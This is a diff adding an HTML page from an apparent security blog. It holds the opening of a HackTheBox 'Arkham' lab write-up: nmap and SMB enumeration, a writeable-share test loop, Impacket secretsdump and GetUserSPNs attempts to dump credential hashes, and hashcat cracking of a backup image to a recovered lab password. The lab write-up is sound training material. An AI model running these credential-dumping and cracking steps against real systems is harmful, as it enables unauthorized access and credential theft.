@@ -1,0 +1,1558 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Pwny_Sec</title>
+    
+      <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="revised" content="2019-08-11T15:23:56 EDT">
+<title> :: Pwny_Sec</title>
+<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
+<link href="/css/font-awesome.min.css" rel="stylesheet">
+<link href="/css/nucleus.css" rel="stylesheet">
+<link href="/theme-flex/style.css" rel="stylesheet">
+
+	<link href="/theme-flex/variant-red.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<script src="/js/jquery-2.x.min.js"></script>
+<script type="text/javascript">
+      var baseurl = "\/";
+</script>
+<meta name="description" content="">
+
+
+
+    
+  </head>
+  <body data-url="/hackthebox/boxes/arkham/arkham/">
+    
+      <header>
+  <div class="logo">
+    
+
+
+
+
+<h2 id="pwny-sec">Pwny_Sec</h2>
+
+
+
+
+  </div>
+  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
+    <nav class="shortcuts">
+            <li class="" role="">
+                <a href="https://twitter.com/pwny_sec"  rel="noopener">
+                  <i class='fa fa-twitter'></i> <label>Twitter</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
+                  <i class='fa fa-github'></i> <label>Github repo</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
+                  <i class='fa fa-cloud-download'></i> <label>Download</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="#"  rel="noopener">
+                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="/credits"  rel="noopener">
+                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
+                </a>
+            </li>
+    </nav>
+</header>
+<article>
+  <aside>
+    <ul class="menu">
+<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
+<li data-nav-id="/concepts/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/dll/" class="dd-item">
+    <div>
+        <a href="/concepts/dll/">
+            DLL_CraFt&amp;BreW
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/file-transfer/" class="dd-item">
+    <div>
+        <a href="/concepts/file-transfer/">
+            File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/linux_enum/" class="dd-item">
+    <div>
+        <a href="/concepts/linux_enum/">
+            Linux Enumeration
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/concepts/windows_enum/" class="dd-item">
+    <div>
+        <a href="/concepts/windows_enum/">
+            Windows
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/bypass/" class="dd-item">
+    <div>
+        <a href="/concepts/bypass/">
+            Windows-Bypass
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/arkham/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/arkham/">ARKHAM-writeup</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/arkham/arkham/" class="dd-item active">
+    <div>
+        <a href="/hackthebox/boxes/arkham/arkham/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/chaos-og/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/chaos-og/">
+            CHAOS
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/inusectf/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/inusectf/">
+            CTF
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/carrier/">
+            Carrier
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/carrier-root/">
+            CarrierRoot
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/devel/">
+            Devel
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/ethereal/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/ethereal/">
+            Ethereal
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/flujab/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/flujab/">
+            Flujab
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/friendzone/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/friendzone/">
+            FriendZone
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/grand-pa/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/grand-pa/">
+            GrandMa
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/lightweight/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/lightweight/">
+            LightWeight
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/optimum/">
+            Optimum
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sizzle/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/sizzle/">
+            Sizzle
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/gold-sizzle/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/gold-sizzle/">
+            Sizzle-Gold
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/vault/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/vault/">
+            Vault
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/help/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/help/">
+            help
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/teacher/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/teacher/">
+            teacher
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
+    <div>
+        <a href="/hackthebox/github/hugopowershell/">
+            Hugo/Github/Power
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
+    <div>
+        <a href="/hackthebox/challenges/bloodhound/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/help/" class="dd-item
+        ">
+    <div>
+
+        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/bloodhound/" class="dd-item">
+    <div>
+        <a href="/tools/bloodhound/">
+            BloodHound Neo4j
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/chisel/" class="dd-item">
+    <div>
+        <a href="/tools/chisel/">
+            ChiselTunnel
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ftp/" class="dd-item">
+    <div>
+        <a href="/tools/ftp/">
+            FTP
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/hydra/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/nmap/" class="dd-item">
+    <div>
+        <a href="/tools/nmap/">
+            Nmap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/smb/smb/" class="dd-item">
+    <div>
+        <a href="/tools/smb/smb/">
+            SMB
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/snmpwalk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/webapp/burp/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
+    <div>
+        <a href="/tools/webapp/sqlmap/sqlmap/">
+            SqlMap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/ssh/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+
+
+
+    </ul>
+    <section>
+    </section>
+  </aside>
+  <section class="page">
+    
+    <div class="nav-select">
+      <center>Navigation : 
+        <select onchange="javascript:location.href = this.value;">
+          
+    <option value="/concepts/" >
+   Concept</option>
+    <option value="/hackthebox/" >
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+    <option value="/hackthebox/boxes/arkham/" >
+  -- 
+   ARKHAM-writeup</option> 
+      <option value="/hackthebox/boxes/arkham/arkham/"  selected>--- </option>
+  
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+      <option value="/hackthebox/boxes/chaos-og/" >-- CHAOS</option>
+      <option value="/hackthebox/boxes/inusectf/" >-- CTF</option>
+      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
+      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
+      <option value="/hackthebox/boxes/ethereal/" >-- Ethereal</option>
+      <option value="/hackthebox/boxes/flujab/" >-- Flujab</option>
+      <option value="/hackthebox/boxes/friendzone/" >-- FriendZone</option>
+      <option value="/hackthebox/boxes/grand-pa/" >-- GrandMa</option>
+    <option value="/hackthebox/boxes/legacy/" >
+  -- 
+   Legacy</option>
+      <option value="/hackthebox/boxes/lightweight/" >-- LightWeight</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/" >
+  -- 
+   SecNotes</option>
+      <option value="/hackthebox/boxes/sizzle/" >-- Sizzle</option>
+      <option value="/hackthebox/boxes/gold-sizzle/" >-- Sizzle-Gold</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+      <option value="/hackthebox/boxes/vault/" >-- Vault</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/zipper/" >
+  -- 
+   Zipper</option>
+      <option value="/hackthebox/boxes/help/" >-- help</option>
+    <option value="/hackthebox/boxes/oz/" >
+  -- 
+   oz</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+      <option value="/hackthebox/boxes/teacher/" >-- teacher</option>
+  
+    <option value="/hackthebox/github/" >
+  - 
+   GitHub</option>
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+  
+    <option value="/help/" >
+   Network Manager Down</option>
+    <option value="/tools/" >
+   Tools</option>
+
+
+
+        </select>
+      </center>
+    </div>
+      <div>
+        <div class="searchbox">
+          <input data-search-input id="search-by" type="text" placeholder="Search...">
+        </div>
+        <script type="text/javascript" src="/js/lunr.min.js"></script>
+        <script type="text/javascript" src="/js/auto-complete.js"></script>
+        <link href="/css/auto-complete.css" rel="stylesheet">
+        <script type="text/javascript">
+          
+              var baseurl = "\/";
+          
+        </script>
+        <script type="text/javascript" src="/js/search.js"></script>
+      </div>
+    
+
+    <h1></h1>
+    
+    
+    
+    
+
+<p>nmap<img src="kefwlkfqwq.PNG" alt="kefwlkfqwq" /></p>
+
+<p>tcp-connect</p>
+
+<pre><code>nmap -oA nmap/tcp-connect 10.10.10.130
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 12:31 EDT
+Nmap scan report for 10.10.10.130
+Host is up (0.044s latency).
+Not shown: 995 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+8080/tcp open  http
+</code></pre>
+
+<p>targeted-scan</p>
+
+<pre><code>nmap -sC -sV -p80,135,139,445,8080 -oA nmap/targeted-scan-sweep 10.10.10.130                                               
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 12:32 EDT
+Nmap scan report for 10.10.10.130                                                                                                                            
+Host is up (0.045s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+8080/tcp open  http          Apache Tomcat 8.5.37
+| http-methods:
+|_  Potentially risky methods: PUT DELETE
+|_http-title: Mask Inc.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 25s, deviation: 0s, median: 25s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2019-03-25 12:33:24
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                         
+</code></pre>
+
+<p>nmap smb scan</p>
+
+<pre><code>nmap --script smb-enum-shares.nse -p445 -oA nmap/smb-scan 10.10.10.130
+</code></pre>
+
+<pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 12:44 EDT
+Nmap scan report for 10.10.10.130
+Host is up (0.042s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 3.81 seconds
+</code></pre>
+
+<p>udp</p>
+
+<p>dig didn&rsquo;t turn anything either</p>
+
+<pre><code>dig arkham.htb  ANT @10.10.10.130
+</code></pre>
+
+<p>scanning the initial 1000 ports didn&rsquo;t yield anything which is highly suspicious</p>
+
+<p>smb enumeration</p>
+
+<p>smb looks promising.</p>
+
+<pre><code>wsmbmap -u guest -H 10.10.10.130 -r                                                                                         
+[+] Finding open SMB ports....                                                                                                                               
+[+] User SMB session establishd on 10.10.10.130...                                                                                                           
+[+] IP: 10.10.10.130:445        Name: 10.10.10.130                                                                                                           
+        Disk                                                    Permissions                                                                                  
+        ----                                                    -----------                                                                                  
+        ADMIN$                                                  NO ACCESS                                                                                    
+        BatShare                                                READ ONLY                                                                                    
+        ./                                                                                                                                                   
+        dr--r--r--                0 Sun Feb  3 08:04:13 2019    .                                                                                            
+        dr--r--r--                0 Sun Feb  3 08:04:13 2019    ..                                                                                           
+        fr--r--r--          4046695 Sun Feb  3 08:04:13 2019    appserver.zip                                                                                
+        C$                                                      NO ACCESS                                                                                    
+        IPC$                                                    READ ONLY                                                                                    
+        ./                                                                                                                                                   
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown                                                                                 
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass                                                                                        
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs                                                                                       
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc                                                                                       
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-378-0                                                         
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper                                                                                     
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1e0-0                                                         
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service                                                                              
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog                                                                                     
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-190-0                                                         
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc                                                                                        
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-3f4-0                                                         
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc                                                                                       
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss                                                                                      
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    trkwks                                                                                       
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-2a8-0                                                         
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT                                                                                  
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-274-0                                                         
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-288-0                                                         
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc                                                                                       
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service                                                                               
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER                                                                                       
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER                                                       
+        Users                                                   READ ONLY           ./
+        dw--w--w--                0 Sun Feb  3 08:24:10 2019    .
+        dw--w--w--                0 Sun Feb  3 08:24:10 2019    ..
+        dw--w--w--                0 Thu Jan 31 21:49:06 2019    Default
+        fr--r--r--              174 Fri Feb  1 11:10:07 2019    desktop.ini
+        dr--r--r--                0 Sun Feb  3 08:24:19 2019    Guest
+                                                                         
+
+</code></pre>
+
+<p>BatManShare</p>
+
+<p>batman left a note to Alfred.</p>
+
+<p><img src="smb.PNG" alt="smb" /></p>
+
+<pre><code>Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce          
+</code></pre>
+
+<p>Everything else looks boring, but well check for writeable drives like in sizzle. by mounting the drives and checking the differences when we try and write to the share. So this is a new note when running this little script and it stops thats most likely a writeable drive. In sizzle there were more directories so it wasn&rsquo;t as obivious.</p>
+
+<p>Guest share is writeable this could be exploited. if psexec.py would detect the share being writeable shme problem with sizzle.</p>
+
+<pre><code>for folder in /mnt/arkham/Guest/**/*; do touch &quot;$folder&quot;; done
+</code></pre>
+
+<p><img src="smb-default-non-write.PNG" alt="smb-default-non-write" /></p>
+
+<p><img src="smb-default-non-write2.PNG" alt="smb-default-non-write2" /></p>
+
+<p>Now on to the impacket enumeration</p>
+
+<p>XD need a password <strong>hmm[</strong></p>
+
+<pre><code>GetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.LOCAL/Administrator
+</code></pre>
+
+<p>Enum4linux failed just ran it with the -a switch</p>
+
+<pre><code>enum4linux -a 10.10.10.130
+</code></pre>
+
+<p>Also ran secretsdump running batman, alfred guest as users to login as with no-pass</p>
+
+<pre><code>secretsdump.py -just-dc Administrator/guest\@10.10.10.130 -no-pass
+</code></pre>
+
+<p>So I walked away with a backup image of a server, Two user names Bruce &amp; Alfred. What ill need to further some of the things tested domain names &amp; passwords.</p>
+
+<p>webapp enumerations</p>
+
+<p>Check for sub-domains, enumerate directories, check port 8080, change local dns, &amp; the initial webpage is the default iss webpages. i might be uploading some exploits and using a some kind of exploitable webpage to gain access. Initial Smb enumeration didn&rsquo;t show anything, further investigation will ensue.</p>
+
+<p>I ran wfuzz it wasn&rsquo;t producing any output check my local dns everything is fine. I believe there may not be any dns for this box because when i just change it to arkham.htb it just hangs. nmap seems to show that there may not be a dns because my udp scan came up empty.</p>
+
+<pre><code>wfuzz -c -f sub-arkham -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u &quot;http://arkham.htb:8080&quot; -H &quot;Host: FUZZ.arkham.htb&quot; -t 42 --hc 200
+</code></pre>
+
+<p>gobuster going to use iis.txt</p>
+
+<p>Gobuster just produces a bunch of 302 errors. Some kind of waf in place.</p>
+
+<pre><code>gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.130:8080/ -t 4
+0 -x aspx,php,asp,net -o gobuster/first.go 
+</code></pre>
+
+<pre><code>&lt;pre&gt;/images (Status: 302)
+/css (Status: 302)
+/js (Status: 302)
+/fonts (Status: 302)
+&lt;/pre&gt;
+</code></pre>
+
+<p>HASHCAT</p>
+
+<p>It&rsquo;s been awhile still hasn&rsquo;t found the password might be something not in rockyou.</p>
+
+<pre><code>hashcat -m 14600 -a 0 -w 3 hashes\backup.img rockyou.txt -o found
+</code></pre>
+
+<p><img src="hashes.PNG" alt="hashes" /></p>
+
+<p><img src="batmanforever.PNG" alt="batmanforever" /></p>
+
+<pre><code>batmanforever
+</code></pre>
+
+<p>Examining Backup.img</p>
+
